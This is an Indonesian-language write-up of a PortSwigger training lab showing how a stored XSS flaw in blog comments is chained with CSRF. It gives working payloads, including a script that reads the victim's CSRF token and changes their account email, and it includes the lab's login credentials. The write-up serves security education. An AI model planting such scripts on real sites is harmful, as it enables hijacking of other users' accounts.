
# Exploiting XSS to perform CSRF
# Mengeksploitasi Cross-Site Scripting untuk Melakukan CSRF

Lab ini mengandung kerentanan **Stored XSS** pada fungsi komentar blog. Untuk menyelesaikan lab ini, eksploitasi kerentanan ini untuk melakukan serangan **CSRF** dan mengubah alamat email seseorang yang melihat komentar postingan blog.

Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut: `wiener:peter`

**Jalur Pembelajaran:** Jika Anda mengikuti jalur pembelajaran yang kami sarankan, harap dicatat bahwa lab ini memerlukan pemahaman tentang topik yang belum kami bahas. Jangan khawatir jika Anda menemui kesulitan; cobalah kembali nanti setelah Anda mengembangkan pengetahuan Anda lebih lanjut.

**Hint:** Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploitasi Anda, pastikan untuk menggunakan alamat email yang berbeda untuk eksploitasi akhir yang Anda sampaikan kepada korban.

---------------------------------------------

## Referensi:

- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [PortSwigger Blog: Exploiting XSS in POST Requests](https://portswigger.net/blog/exploiting-xss-in-post-requests)
- [MDN Web Docs: XMLHttpRequest.send()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send)

![Langkah 1](images/Exploiting%20XSS%20to%20perform%20CSRF/1.png)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Mengidentifikasi Kerentanan XSS pada Fungsi Komentar Blog

Pertama, kita perlu memastikan bahwa terdapat kerentanan XSS pada fungsi komentar blog. Payload sederhana berikut dapat digunakan untuk menguji kerentanan tersebut:

```html
</p><img src=x onerror=alert(1) /><p>
<script>alert(1)</script>
```

![Langkah 1](images/Exploiting%20XSS%20to%20perform%20CSRF/1.png)

Payload ini menjalankan fungsi `alert` untuk memastikan bahwa kerentanan XSS benar-benar ada.

### 2. Memahami Fungsi Pembaruan Email

Terdapat fungsi untuk memperbarui email pengguna, yang menerima permintaan POST. Berikut adalah tampilan dari permintaan POST tersebut:

![Langkah 2](images/Exploiting%20XSS%20to%20perform%20CSRF/2.png)

### 3. Memahami Fungsi Posting Komentar

Fungsi ini digunakan untuk memposting komentar pada blog:

![Langkah 3](images/Exploiting%20XSS%20to%20perform%20CSRF/3.png)

### 4. Menguji Payload XSS yang Berfungsi

Beberapa payload XSS yang berhasil dieksekusi adalah sebagai berikut:

```
</p><img src=x onerror=alert(1) /><p>
<script>alert(1)</script>
```

![Langkah 4](images/Exploiting%20XSS%20to%20perform%20CSRF/4.png)

### 5. Membuat Payload CSRF dengan XSS

Kita akan menggunakan payload berikut yang mirip dengan yang ada di [PortSwigger Blog](https://portswigger.net/blog/exploiting-xss-in-post-requests):

```html
<form name=TheForm action=https://0a8100660449e28b80a50877005400f4.web-security-academy.net/my-account/change-email method=post>
    <input type=hidden name="csrf" value="wV6Kw7g2mIv6JLKjoQjmb3Nd6BhhXbmg">
    <input type=hidden name="email" value="test7@test.com">
</form>
<script>
    document.TheForm.submit();
</script>
```

Ketika halaman diakses, payload ini akan membuat permintaan POST sebagai berikut:

![Langkah 5](images/Exploiting%20XSS%20to%20perform%20CSRF/5.png)

Permintaan POST ini akan mengubah email pengguna Anda menjadi `test7@test.com`:

![Langkah 6](images/Exploiting%20XSS%20to%20perform%20CSRF/6.png)

Namun, metode ini tidak berhasil karena kita menggunakan nilai CSRF token yang di-hardcode. Untuk mengatasi hal ini, kita perlu mengambil nilai CSRF token secara dinamis dari halaman `/my-account`.

### 6. Mengambil CSRF Token secara Dinamis dan Melakukan CSRF

Untuk mengambil CSRF token dari halaman `/my-account`, kita dapat menggunakan skrip berikut:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    
    function handleResponse() {
        var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        console.log(csrf_token);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/my-account/change-email', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = () => { 
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                // Permintaan berhasil
            }
        }
        xhr.send("email=test12@test.com&csrf="+csrf_token);
    };
</script>
```

Skrip ini melakukan hal berikut:
1. Mengirim permintaan GET ke `/my-account` untuk mengambil halaman akun.
2. Menggunakan ekspresi reguler untuk mengekstrak nilai CSRF token dari respons.
3. Mengirim permintaan POST ke `/my-account/change-email` dengan email baru dan CSRF token yang diambil.

![Langkah 7](images/Exploiting%20XSS%20to%20perform%20CSRF/7.png)

Setelah menjalankan skrip ini, email pengguna yang menjadi korban akan diubah menjadi `test12@test.com`.

### 7. Menyusun Payload Akhir untuk Korban

Payload akhir yang harus Anda injeksikan ke dalam komentar blog korban adalah sebagai berikut. Pastikan untuk mengganti `YOUR_CSRF_TOKEN` dengan token CSRF yang valid jika diperlukan atau memastikan skrip dapat mengambilnya secara dinamis:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/my-account/change-email', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("email=korbanbaru@test.com&csrf=" + csrf_token);
    };
    req.open('GET', '/my-account', true);
    req.send();
</script>
```

Dengan memasukkan payload ini ke dalam komentar blog korban, setiap kali korban melihat komentar tersebut, skrip akan dijalankan dan alamat email mereka akan diubah.

![Langkah 8](images/Exploiting%20XSS%20to%20perform%20CSRF/8.png)

## Penjelasan

**Cross-Site Scripting (XSS)** adalah kerentanan keamanan yang memungkinkan penyerang untuk menyuntikkan skrip berbahaya ke dalam situs web yang dipercaya oleh pengguna. Dalam kasus ini, kerentanan **Stored XSS** memungkinkan skrip berbahaya disimpan di server (misalnya, dalam komentar blog) dan dijalankan setiap kali pengguna melihat konten tersebut.

**Cross-Site Request Forgery (CSRF)** adalah serangan yang memaksa pengguna yang sudah terautentikasi untuk melakukan tindakan yang tidak diinginkan pada aplikasi web di mana mereka sedang terautentikasi.

### Menggabungkan XSS dan CSRF

Dengan memanfaatkan kerentanan XSS, penyerang dapat menyuntikkan skrip yang secara otomatis melakukan serangan CSRF. Dalam konteks lab ini, skrip yang disuntikkan akan mengirim permintaan POST untuk mengubah alamat email korban tanpa sepengetahuan mereka.

### Langkah-Langkah Rinci

1. **Mengidentifikasi Kerentanan XSS:**
   - Menggunakan payload sederhana seperti `<script>alert('XSS')</script>` untuk memastikan bahwa input komentar dieksekusi sebagai JavaScript.

2. **Menyusun Payload CSRF:**
   - Membuat formulir tersembunyi yang mengirimkan permintaan POST ke endpoint `/my-account/change-email` dengan nilai email baru dan CSRF token yang valid.

3. **Mengambil CSRF Token Secara Dinamis:**
   - Karena CSRF token bervariasi dan dihasilkan secara dinamis, skrip perlu mengambil token tersebut dari halaman `/my-account` sebelum mengirimkan permintaan POST.

4. **Menginjeksikan dan Menjalankan Skrip:**
   - Menyuntikkan skrip yang mengambil CSRF token dan mengirim permintaan POST untuk mengubah alamat email korban.

### Pentingnya Validasi dan Sanitasi Input

Kerentanan XSS dapat dieksploitasi untuk berbagai serangan, termasuk pencurian cookie, pengambilalihan sesi, dan serangan CSRF seperti yang dijelaskan di atas. Oleh karena itu, sangat penting untuk selalu memvalidasi dan menyaring input pengguna di sisi server untuk mencegah penyuntikan skrip berbahaya.

## Kesimpulan

Eksploitasi **Stored XSS** memungkinkan penyerang untuk menjalankan skrip berbahaya dalam konteks pengguna yang terautentikasi. Dengan menggabungkan XSS dengan serangan **CSRF**, penyerang dapat melakukan tindakan yang tidak diinginkan atas nama korban, seperti mengubah alamat email atau informasi sensitif lainnya. Penting untuk selalu menerapkan praktik keamanan terbaik, seperti sanitasi input dan penggunaan token CSRF yang aman, untuk mencegah kerentanan ini.

## Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
